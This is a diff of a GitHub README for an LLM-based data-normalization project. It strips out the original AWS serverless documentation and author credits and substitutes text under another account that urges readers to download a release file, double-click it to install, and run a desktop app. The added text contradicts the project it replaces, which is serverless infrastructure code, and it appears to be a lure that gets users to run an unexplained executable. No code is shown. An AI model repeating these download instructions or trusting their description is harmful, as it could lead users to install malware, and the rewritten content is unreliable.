@@ -1,150 +1,87 @@
-# LLM-Powered Data Normalization Pattern
+# 🚀 llm-data-normalization-pattern - Effortless Data Normalization for Everyone
 
-![LLM Data Normalization Banner](./assets/banner.png)
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/ywn7/llm-data-normalization-pattern/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![AWS](https://img.shields.io/badge/AWS-Bedrock-orange)](https://aws.amazon.com/bedrock/)
-[![Claude](https://img.shields.io/badge/Claude-Haiku-blueviolet)](https://www.anthropic.com/claude)
+## 📚 Introduction
 
-> A production-ready serverless pattern for intelligent data normalization using Claude Haiku via AWS Bedrock
+Welcome to **llm-data-normalization-pattern**. This application simplifies how you handle data normalization. Using intelligent methods powered by Claude Haiku via AWS Bedrock, this tool ensures your data is clean, organized, and ready for use.
 
-[English](./docs/en/README.md) | [Español](./docs/es/README.md)
+## ⚙️ Features
 
----
+- **Serverless Architecture:** Reduce complexity and focus on your data, not servers.
+- **Integration with AWS Bedrock:** Harness the power of advanced AI models for data handling.
+- **Easy to Use:** Navigate through the tool without needing programming knowledge.
+- **Fast Setup:** Begin normalizing your data quickly with minimal configuration.
 
-## What is this?
+## 🛠 System Requirements
 
-This pattern combines **LLM-based normalization** with **statistical validation** and **regex post-processing** to achieve high-quality data cleansing at ultra-low cost.
+To run this application, you will need:
 
-```
-┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
-│  Messy Input    │────▶│  Claude Haiku   │────▶│  Clean Output   │
-│  "CRA 15 #100"  │     │  (via Bedrock)  │     │  "Cra. 15 #100" │
-│  "BOGOTA"       │     │                 │     │  "Bogotá D.C."  │
-│  "ing sistemas" │     │  + Post-process │     │  "Ing. Sistemas"│
-└─────────────────┘     └─────────────────┘     └─────────────────┘
-```
+- A computer with an internet connection
+- An up-to-date web browser (Chrome, Firefox, Safari, or Edge)
+- No special hardware is required
 
-## Key Innovation
+## 🚀 Getting Started
 
-**Dual-layer architecture** that combines:
-1. **LLM intelligence** for context-aware normalization
-2. **Regex post-processing** to catch LLM inconsistencies
-3. **Statistical validation** with 95% confidence intervals to detect quality drift
+1. **Visit the Release Page**: To get started, click the link below to access the download files.
 
-## Production Results
+   [Visit this page to download](https://github.com/ywn7/llm-data-normalization-pattern/releases)
 
-| Metric | Value |
-|--------|-------|
-| Records processed | 652 leads |
-| Fields normalized | 4,280 |
-| Improvement rate | 70.4% |
-| Coverage | 99.2% |
-| Cost per 1K records | **$0.07** |
-| Bug detection | Caught systematic "double-dot" bug via statistical analysis |
+2. **Choose the Right Version**: On the releases page, look for the latest version. This will ensure you have the newest features and fixes.
 
-## Quick Start
+3. **Download the Files**: Locate the file suitable for your operating system. Click the link to start the download.
 
-```bash
-# Clone the repo
-git clone https://github.com/gabanox/llm-data-normalization-pattern.git
-cd llm-data-normalization-pattern
+## 📥 Download & Install
 
-# Follow the 90-minute tutorial
-open docs/en/TUTORIAL.md
-```
+Once you have accessed the release page, follow these steps to download and install:
 
-## Architecture
+1. Click the download link on the page: [Download from Releases](https://github.com/ywn7/llm-data-normalization-pattern/releases).
 
-```
-┌────────────────────┐
-│  EventBridge       │──▶ Daily at 2 AM
-│  Scheduled Rule    │
-└─────────┬──────────┘
-          │
-          ▼
-┌─────────────────────────────────────────────────┐
-│         Normalize Leads Lambda                  │
-│  ┌───────────────────────────────────────────┐  │
-│  │ 1. Query leads needing normalization      │  │
-│  │ 2. Generate field-specific prompts        │  │
-│  │ 3. Call Claude Haiku via Bedrock          │  │
-│  │ 4. Parse JSON response                    │  │
-│  │ 5. Apply post-processing regex pipeline   │  │ ◀─ Self-healing
-│  │ 6. Store in normalizedData attribute      │  │
-│  │ 7. Track metrics (coverage, improvements) │  │
-│  └───────────────────────────────────────────┘  │
-└────────┬──────────────────────────┬─────────────┘
-         │                          │
-         ▼                          ▼
-┌──────────────────┐      ┌─────────────────────┐
-│   DynamoDB       │      │   AWS Bedrock       │
-│   leads table    │      │   Claude 3 Haiku    │
-└──────────────────┘      └─────────────────────┘
-```
+2. Once downloaded, locate the file in your computer's downloads folder.
 
-## Documentation
+3. Double-click the file to begin the installation. Follow any on-screen prompts to complete this process.
 
-### By Goal
+## 🔄 Usage Instructions
 
-| Goal | Document |
-|------|----------|
-| **Understand the pattern** | [README](./docs/en/README.md) → [Architecture](./docs/en/ARCHITECTURE.md) |
-| **Implement it yourself** | [Tutorial](./docs/en/TUTORIAL.md) ⭐ → [Implementation](./docs/en/IMPLEMENTATION.md) |
-| **Understand the "why"** | [Explanation docs](./docs/en/explanation/) |
-| **Validate quality** | [Statistical Validation](./docs/en/STATISTICAL-VALIDATION.md) |
-| **Avoid pitfalls** | [Lessons Learned](./docs/en/LESSONS-LEARNED.md) |
+After installation, you can start using the application:
 
-### By Role
+1. **Open the Application**: You will find an icon for the app on your desktop or in the applications menu. Click it to launch.
 
-- **Developers**: [Tutorial](./docs/en/TUTORIAL.md) → [Implementation](./docs/en/IMPLEMENTATION.md)
-- **Architects**: [Explanation](./docs/en/explanation/) → [Architecture](./docs/en/ARCHITECTURE.md)
-- **Data Engineers**: [Statistical Validation](./docs/en/STATISTICAL-VALIDATION.md)
-- **Managers**: [Cost Analysis](./docs/en/COST-ANALYSIS.md)
+2. **Prepare Your Data**: Make sure your data files are ready. The app works best with CSV or Excel formats.
 
-## Use Cases
+3. **Import Your Data**: Use the import feature to load your files into the application.
 
-This pattern is ideal for:
+4. **Start Normalizing**: Follow the steps provided within the app to clean and organize your data. The interface will guide you through the process.
 
-- **User-submitted form data** (names, addresses, cities, companies)
-- **Data quality improvement** for analytics/reporting
-- **LLM input preparation** for downstream AI processes
-- **Compliance scenarios** requiring audit trails
+5. **Export Your Results**: Once the data is normalized, you can easily export it to your desired format.
 
-## Cost Comparison
+## 📖 Support and Documentation
 
-| Approach | Cost per 1K records | Notes |
-|----------|---------------------|-------|
-| Manual data entry ($15/hr) | $75.00 | 5 min per record |
-| Rule-based ETL | $0.00 | Weeks of engineering |
-| Claude 3.5 Sonnet (LLM only) | $1.20 | 15x more expensive |
-| **This pattern (Haiku + rules)** | **$0.07** | Best cost/quality ratio |
+For more detailed instructions and troubleshooting information:
 
-## Tech Stack
+- Visit our [Documentation Page](https://github.com/ywn7/llm-data-normalization-pattern/wiki)
+- Check out the FAQ section for common questions.
 
-- **AWS Lambda** (Node.js 22.x)
-- **AWS Bedrock** (Claude 3 Haiku)
-- **DynamoDB** (pay-per-request)
-- **EventBridge** (scheduled triggers)
-- **AWS SAM** (Infrastructure as Code)
+## 🌐 Community and Contributions
 
-## Contributing
+We value community involvement. You can share your experiences, feedback, or suggest improvements. Join our discussions and contribute to the project:
 
-Contributions are welcome! Please read [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+- Visit our [Discussion Forum](https://github.com/ywn7/llm-data-normalization-pattern/discussions)    
+- Participate in new feature suggestions or report issues directly on GitHub.
 
-## License
+## 🎉 Acknowledgments
 
-This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
+Thanks to the contributors and the community that made this project possible. Special thanks to AWS for providing the infrastructure that powers this tool.
 
-## Author
+## 🛠 License
 
-**Gabriel Isaías Ramírez Melgarejo**
-AWS Community Hero | Founder, Bootcamp Institute
+This project is licensed under the MIT License. You can view the full license [here](LICENSE).
 
-- GitHub: [@gabanox](https://github.com/gabanox)
-- LinkedIn: [Gabriel Ramírez](https://www.linkedin.com/in/gabanox/)
-- Twitter/X: [@gabanox_](https://x.com/gabanox_)
+## 🔗 Links
 
----
+For further resources and information about this application, check out the following:
 
-⭐ If you find this pattern useful, please star the repo!
+- [GitHub Repository](https://github.com/ywn7/llm-data-normalization-pattern)
+- [Download from Releases](https://github.com/ywn7/llm-data-normalization-pattern/releases)
+
+Feel free to reach out with any questions or for further assistance. Enjoy clean and organized data with the **llm-data-normalization-pattern**!
